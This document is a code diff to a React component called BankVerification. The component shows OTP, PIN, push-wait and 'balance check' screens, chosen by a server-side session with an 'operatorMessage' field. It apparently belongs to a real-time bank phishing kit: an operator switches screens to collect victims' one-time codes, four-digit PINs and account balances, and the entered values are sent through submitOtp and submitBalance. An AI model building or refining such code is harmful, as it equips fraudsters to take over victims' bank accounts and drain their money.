@@ -1,8 +1,14 @@
-import React, { Suspense, useState, useEffect, useCallback } from "react";
+import React, { useState, useEffect, useCallback } from "react";
 import { useSessionStatus } from "../hooks/use-session-status";
 import { useResendCountdown } from "../hooks/use-resend-countdown";
 import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
-import { StatusOverlay } from "../layouts/generic";
+import {
+  StatusOverlay,
+  SmsOtp,
+  PinEntry,
+  PushWaiting,
+  BalanceCheck,
+} from "../layouts/generic";
 import type { BankVerificationProps } from "../types";
 
 const RESEND_COOLDOWN = 60;
@@ -14,11 +20,11 @@ function normalizeLayout(slug: string | undefined): string {
   return slug;
 }
 
-const LAYOUT_MAP: Record<string, React.LazyExoticComponent<React.ComponentType<any>>> = {
-  sms: React.lazy(() => import("../layouts/generic/SmsOtp").then((m) => ({ default: m.SmsOtp }))),
-  pin: React.lazy(() => import("../layouts/generic/PinEntry").then((m) => ({ default: m.PinEntry }))),
-  push: React.lazy(() => import("../layouts/generic/PushWaiting").then((m) => ({ default: m.PushWaiting }))),
-  balance: React.lazy(() => import("../layouts/generic/BalanceCheck").then((m) => ({ default: m.BalanceCheck }))),
+const LAYOUT_MAP: Record<string, React.ComponentType<any>> = {
+  sms: SmsOtp,
+  pin: PinEntry,
+  push: PushWaiting,
+  balance: BalanceCheck,
 };
 
 export function BankVerification({
@@ -32,7 +38,10 @@ export function BankVerification({
 }: BankVerificationProps) {
   const [error, setError] = useState<string | null>(null);
   const [submitting, setSubmitting] = useState(false);
-  const [resetKey, setResetKey] = useState(0);
+  const [code, setCode] = useState("");
+  const [pinValue, setPinValue] = useState("");
+  const [pinMasked, setPinMasked] = useState(true);
+  const [balance, setBalance] = useState("");
 
   const { status, verificationLayout, bank, redirectUrl, transactionDetails, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
     useSessionStatus(apiBase, channelSlug, sessionId);
@@ -49,7 +58,8 @@ export function BankVerification({
   useEffect(() => {
     if (wrongCode || expiredCode) {
       setSubmitting(false);
-      setResetKey((k) => k + 1);
+      setCode("");
+      setPinValue("");
     }
   }, [wrongCode, expiredCode]);
 
@@ -135,33 +145,53 @@ export function BankVerification({
         ? {
             bank,
             transactionDetails,
-            onError: (m: string) => setError(m),
+            balance,
+            onBalanceChange: setBalance,
             operatorMessage,
-            onSubmit: handleSubmitBalance,
+            onSubmit: () => handleSubmitBalance(balance),
             submitting,
+            canSubmit: balance.trim().length > 0,
           }
-        : {
-            bank,
-            transactionDetails,
-            onError: (m: string) => setError(m),
-            wrongCode,
-            expiredCode,
-            onTryAgain: clearCodeFeedback,
-            operatorMessage,
-            onSubmit: handleSubmitOtp,
-            submitting,
-            resendState,
-            resetKey,
-          };
+        : baseLayout === "pin"
+          ? {
+              bank,
+              transactionDetails,
+              pinValue,
+              onPinChange: (v: string) => {
+                setPinValue(v);
+                if (v.length === 4) {
+                  clearCodeFeedback?.();
+                  handleSubmitOtp(v);
+                }
+              },
+              pinMasked,
+              onPinMaskToggle: () => setPinMasked((m) => !m),
+              wrongCode,
+              expiredCode,
+              onTryAgain: clearCodeFeedback,
+              operatorMessage,
+              submitting,
+              resendState,
+            }
+          : {
+              bank,
+              transactionDetails,
+              code,
+              onCodeChange: setCode,
+              wrongCode,
+              expiredCode,
+              onTryAgain: clearCodeFeedback,
+              operatorMessage,
+              onSubmit: () => handleSubmitOtp(code),
+              submitting,
+              canSubmit: code.replace(/\D/g, "").length >= 6,
+              resendState,
+            };
 
   return (
     <div className="bank-ui-verification">
       {inProgress && <StatusOverlay />}
-      {awaitingVerification && (
-        <Suspense fallback={<StatusOverlay />}>
-          <Layout {...layoutProps} />
-        </Suspense>
-      )}
+      {awaitingVerification && <Layout {...layoutProps} />}
       {error && (
         <div className="bank-ui-error-toast-wrapper">
           <div className="bank-ui-error-toast">{error}</div>
